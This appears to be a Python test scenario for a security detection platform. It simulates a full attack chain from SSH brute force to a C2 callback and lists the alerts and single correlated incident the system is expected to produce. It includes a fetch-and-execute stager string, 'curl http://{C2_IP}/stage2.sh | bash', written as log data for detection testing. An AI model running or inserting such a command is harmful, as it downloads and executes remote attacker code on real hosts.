"""Scenario 6: the full attack chain (Phase 8).

Every earlier scenario, in sequence, from one adversary against one account::

    SSH failures -> successful login -> suspicious sudo
                 -> shell spawned by a download tool -> outbound connection

This is the primary SentinelForge demonstration: it is the only scenario that
exercises all five detection rules, both telemetry sensors, multi-stage
correlation, the attack-chain patterns, the process tree, the network view, the
AI reading and the containment lifecycle at once.

The single most important expectation is ``incidents == 1``.  Five alerts from
five different rules across four minutes must be reconstructed as *one story*.
A platform that produced five incidents here would be technically detecting
everything and operationally useless.
"""

from __future__ import annotations

from datetime import datetime

from ..scenario import (
    ATTACKER_IP,
    C2_IP,
    Expectation,
    INTERNAL_IP,
    Scenario,
    ScenarioKind,
    network_connection,
    process_start,
    session_open,
    ssh_failure,
    ssh_success,
    sudo_command,
)

OPERATOR = "deploy"
FAILURES = 5
SSHD_PID = 1200
SHELL_PID = 4100
CURL_PID = 4200
PAYLOAD_PID = 4300
C2_PORT = 443

#: The sudo command line, as a *string in a log message*.  It is never run.
STAGER = f"/usr/bin/curl http://{C2_IP}/stage2.sh | bash"


def build(base: datetime) -> list:
    events = [ssh_failure(index * 30, base, ATTACKER_IP, OPERATOR) for index in range(FAILURES)]
    events.append(ssh_success(150, base, ATTACKER_IP, OPERATOR))
    events.append(session_open(152, base, OPERATOR, ATTACKER_IP))
    events.append(sudo_command(200, base, STAGER, OPERATOR))
    events.append(
        process_start(
            210, base, process="bash", pid=SHELL_PID, ppid=SSHD_PID, parent="sshd",
            command_line="-bash", user=OPERATOR, executable="/usr/bin/bash",
        )
    )
    events.append(
        process_start(
            215, base, process="curl", pid=CURL_PID, ppid=SHELL_PID, parent="bash",
            command_line=f"curl -s http://{C2_IP}/stage2.sh", user=OPERATOR,
            executable="/usr/bin/curl",
        )
    )
    events.append(
        process_start(
            220, base, process="sh", pid=PAYLOAD_PID, ppid=CURL_PID, parent="curl",
            command_line="sh", user=OPERATOR, executable="/usr/bin/sh",
        )
    )
    events.append(
        network_connection(
            240, base, process="sh", pid=PAYLOAD_PID, destination_ip=C2_IP,
            destination_port=C2_PORT, user=OPERATOR, source_ip=INTERNAL_IP,
        )
    )
    return events


SCENARIO = Scenario(
    scenario_id="full-attack",
    name="Full Attack Chain",
    description=(
        "Brute force, successful login, download-and-execute via sudo, a shell "
        "spawned by curl, and a callback to the same address - one adversary, "
        "one account, four minutes."
    ),
    kind=ScenarioKind.ATTACK,
    mitre_techniques=(
        "T1110", "T1110.001", "T1078", "T1078.003", "T1105", "T1059", "T1059.004", "T1071",
    ),
    build=build,
    tags=("full-chain", "demonstration", "ebpf", "correlation"),
    containment_target=("block_ip", ATTACKER_IP),
    expected=Expectation(
        events=FAILURES + 7,
        alerts=5,
        incidents=1,
        rule_ids=frozenset(
            {
                "SSH_BRUTE_FORCE",
                "SSH_COMPROMISE_SUSPECTED",
                "SUSPICIOUS_SUDO",
                "SUSPICIOUS_PROCESS_EXECUTION",
                "SUSPICIOUS_NETWORK_CONNECTION",
            }
        ),
        forbidden_rule_ids=frozenset({"PORT_SCAN", "AUTH_INVALID_USER"}),
        severity="critical",
        risk_range=(95, 100),
        techniques=frozenset(
            {"T1110", "T1110.001", "T1078", "T1078.003", "T1105", "T1059", "T1059.004", "T1071"}
        ),
        attack_chains=frozenset(
            {
                "AUTH_THEN_PROCESS_THEN_NETWORK",
                "POSSIBLE_ACCOUNT_COMPROMISE",
                "BRUTE_FORCE_THEN_SUCCESS",
            }
        ),
        source_ips=frozenset({ATTACKER_IP, C2_IP}),
        users=frozenset({OPERATOR}),
        response_options=frozenset({"block_ip", "kill_process"}),
        process_tree_pids=frozenset({CURL_PID, PAYLOAD_PID}),
        process_tree_missing_pids=frozenset({SSHD_PID, SHELL_PID}),
        network_destinations=frozenset({f"{C2_IP}:{C2_PORT}"}),
        notes=(
            "Five rules, five alerts, one incident. The incident count is the "
            "point: correlation has to tell one story, not five."
        ),
    ),
)
